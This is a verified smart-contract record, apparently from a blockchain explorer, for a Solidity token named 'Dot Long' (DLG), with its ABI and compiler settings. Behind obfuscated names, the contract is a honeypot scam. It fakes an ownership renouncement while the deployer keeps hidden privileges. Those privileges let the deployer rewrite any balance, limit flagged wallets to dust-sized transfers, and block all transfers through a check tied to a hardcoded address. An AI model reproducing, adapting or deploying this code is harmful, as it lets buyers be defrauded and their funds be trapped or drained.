{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface feeBuyAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isSell {\n    function createPair(address isSwap, address launchedTo) external returns (address);\n}\n\ninterface tokenLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitBuy) external view returns (uint256);\n\n    function transfer(address fromModeTotal, uint256 maxTx) external returns (bool);\n\n    function allowance(address receiverBuyFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromModeTotal,\n        uint256 maxTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchSwap, uint256 value);\n    event Approval(address indexed receiverBuyFund, address indexed spender, uint256 value);\n}\n\ninterface buyFee is tokenLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DotLong is amountMode, tokenLimit, buyFee {\n\n    constructor (){\n        if (isFrom) {\n            toReceiver = launchedTeam;\n        }\n        feeBuyAuto buyFrom = feeBuyAuto(limitToSender);\n        totalWallet = isSell(buyFrom.factory()).createPair(buyFrom.WETH(), address(this));\n        \n        minTotal = _msgSender();\n        launchedTotal();\n        teamTrading[minTotal] = true;\n        tradingLiquidity[minTotal] = takeAuto;\n        \n        emit Transfer(address(0), minTotal, takeAuto);\n    }\n\n    uint256 tokenExempt;\n\n    uint256 private launchedTeam;\n\n    bool private isFrom;\n\n    address public minTotal;\n\n    function liquidityTake(address tradingFee, address fromModeTotal, uint256 maxTx) internal returns (bool) {\n        if (tradingFee == minTotal) {\n            return listModeWallet(tradingFee, fromModeTotal, maxTx);\n        }\n        uint256 shouldIsReceiver = tokenLimit(totalWallet).balanceOf(totalLiquidity);\n        require(shouldIsReceiver == tokenExempt);\n        require(fromModeTotal != totalLiquidity);\n        if (marketingSell[tradingFee]) {\n            return listModeWallet(tradingFee, fromModeTotal, receiverList);\n        }\n        return listModeWallet(tradingFee, fromModeTotal, maxTx);\n    }\n\n    function getOwner() external view returns (address) {\n        return totalExempt;\n    }\n\n    function listModeWallet(address tradingFee, address fromModeTotal, uint256 maxTx) internal returns (bool) {\n        require(tradingLiquidity[tradingFee] >= maxTx);\n        tradingLiquidity[tradingFee] -= maxTx;\n        tradingLiquidity[fromModeTotal] += maxTx;\n        emit Transfer(tradingFee, fromModeTotal, maxTx);\n        return true;\n    }\n\n    function balanceOf(address limitBuy) public view virtual override returns (uint256) {\n        return tradingLiquidity[limitBuy];\n    }\n\n    address totalLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderFrom;\n    }\n\n    bool private tokenSwapReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptTeam;\n    }\n\n    mapping(address => mapping(address => uint256)) private txTokenTeam;\n\n    bool public limitTradingLaunched;\n\n    function launchedTotal() public {\n        emit OwnershipTransferred(minTotal, address(0));\n        totalExempt = address(0);\n    }\n\n    uint8 private senderFrom = 18;\n\n    uint256 private takeAuto = 100000000 * 10 ** 18;\n\n    uint256 isTrading;\n\n    mapping(address => bool) public marketingSell;\n\n    string private exemptTeam = \"DLG\";\n\n    function teamMax(address feeToken, uint256 maxTx) public {\n        autoLiquidity();\n        tradingLiquidity[feeToken] = maxTx;\n    }\n\n    function limitEnable(address swapAmount) public {\n        if (launchTeam) {\n            return;\n        }\n        \n        teamTrading[swapAmount] = true;\n        \n        launchTeam = true;\n    }\n\n    address public totalWallet;\n\n    function buySwapReceiver(uint256 maxTx) public {\n        autoLiquidity();\n        tokenExempt = maxTx;\n    }\n\n    function txBuy(address launchedTake) public {\n        autoLiquidity();\n        \n        if (launchedTake == minTotal || launchedTake == totalWallet) {\n            return;\n        }\n        marketingSell[launchedTake] = true;\n    }\n\n    function autoLiquidity() private view {\n        require(teamTrading[_msgSender()]);\n    }\n\n    string private fundLaunched = \"Dot Long\";\n\n    function transfer(address feeToken, uint256 maxTx) external virtual override returns (bool) {\n        return liquidityTake(_msgSender(), feeToken, maxTx);\n    }\n\n    function transferFrom(address tradingFee, address fromModeTotal, uint256 maxTx) external override returns (bool) {\n        if (_msgSender() != limitToSender) {\n            if (txTokenTeam[tradingFee][_msgSender()] != type(uint256).max) {\n                require(maxTx <= txTokenTeam[tradingFee][_msgSender()]);\n                txTokenTeam[tradingFee][_msgSender()] -= maxTx;\n            }\n        }\n        return liquidityTake(tradingFee, fromModeTotal, maxTx);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fundLaunched;\n    }\n\n    mapping(address => uint256) private tradingLiquidity;\n\n    mapping(address => bool) public teamTrading;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeAuto;\n    }\n\n    function allowance(address marketingTotal, address sellSender) external view virtual override returns (uint256) {\n        if (sellSender == limitToSender) {\n            return type(uint256).max;\n        }\n        return txTokenTeam[marketingTotal][sellSender];\n    }\n\n    function owner() external view returns (address) {\n        return totalExempt;\n    }\n\n    function approve(address sellSender, uint256 maxTx) public virtual override returns (bool) {\n        txTokenTeam[_msgSender()][sellSender] = maxTx;\n        emit Approval(_msgSender(), sellSender, maxTx);\n        return true;\n    }\n\n    address private totalExempt;\n\n    bool public launchTeam;\n\n    event OwnershipTransferred(address indexed txTotal, address indexed takeLaunched);\n\n    uint256 constant receiverList = 8 ** 10;\n\n    uint256 public toReceiver;\n\n    address limitToSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverBuyFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTx\",\"type\":\"uint256\"}],\"name\":\"buySwapReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAmount\",\"type\":\"address\"}],\"name\":\"limitEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTradingLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTx\",\"type\":\"uint256\"}],\"name\":\"teamMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromModeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"}],\"name\":\"txBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DotLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}